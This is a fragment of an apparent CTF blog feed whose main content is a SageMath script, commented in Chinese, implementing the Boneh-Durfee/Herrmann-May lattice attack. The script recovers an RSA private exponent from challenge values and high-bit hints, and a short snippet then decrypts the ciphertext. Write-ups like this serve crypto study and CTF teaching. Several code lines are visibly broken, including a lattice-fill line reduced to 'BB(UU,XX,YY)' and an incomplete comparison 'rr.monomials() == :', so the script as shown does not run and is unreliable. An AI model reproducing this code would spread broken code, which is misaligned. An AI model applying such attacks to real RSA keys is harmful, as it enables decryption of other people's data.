class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class="line"><span class="comment"># 显示有用矢量的统计数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span></span><br><span class="line"><span class="comment"># 显示带有 0 和 X 的矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试删除无用的向量</span></span><br><span class="line"><span class="comment"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始从后面检查</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  如果它没有用</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># 让我们检查它是否影响其他向量</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># 如果另一个向量受到影响：</span></span><br><span class="line">                <span class="comment"># 我们增加计数</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等级：0</span></span><br><span class="line">            <span class="comment"># 如果没有其他载体最终受到影响</span></span><br><span class="line">            <span class="comment"># 我们删除它</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># 等级：1</span></span><br><span class="line">            <span class="comment">#如果只有一个受到影响，我们会检查</span></span><br><span class="line">            <span class="comment"># 如果它正在影响别的向量</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># 如果它影响哪怕一个向量</span></span><br><span class="line">                    <span class="comment"># 我们放弃这个</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class="line">                <span class="comment"># 这个有用的向量不够有用</span></span><br><span class="line">                <span class="comment">#与我们无用的相比</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 在以下情况下找到解决方案：</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#多项式环</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-移位</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 x 移位列表</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#对于多项式中的单项式。单项式（）：</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># 如果单项不在单项中</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-移位</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 y 移位列表</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 构造格 B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB(UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#约化格的原型</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #自动删除</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 重置维度</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查向量是否有帮助</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查行列式是否正确界定</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;在格中寻找线性无关向量&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 对于i and j, 构造两个多项式</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 结果</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == :</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># 随机生成数据</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line">        e = <span class="number">31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line">        c = <span class="number">44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line">        hint1 =  <span class="number">597218086872775768003</span></span><br><span class="line">        hint2 =  <span class="number">836339982627318976124</span></span><br><span class="line"><span class="comment">#         print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 解密指数d的指数( 最大0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># 格大小（越大越好/越慢）</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># 来自 Herrmann 和 May 的优化</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># 如果 p、 q 大小相同，则正确</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#构建的方程</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== 核对数据 ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;p的高比特为：&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;q的高比特为：&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="/images/others/beafc4c5fa7767dde8df4f716745e5b.png" alt="image-20220124192143500"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">597218086872775768003</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="number">836339982627318976124</span></span><br><span class="line"></span><br><span class="line">d= <span class="number">723139209811695466615412520251642069457719866228119412426018806563095539525831453648719201</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023部分wp</title>
      <link href="/2023/10/23/0xGame2023%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/10/23/0xGame2023%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF 2023 公开赛道 WEEK1</title>
      <link href="/2023/10/09/2023%E6%96%B0%E7%94%9F%E8%B5%9B/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEEK1/"/>
      <url>/2023/10/09/2023%E6%96%B0%E7%94%9F%E8%B5%9B/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEEK1/</url>
      
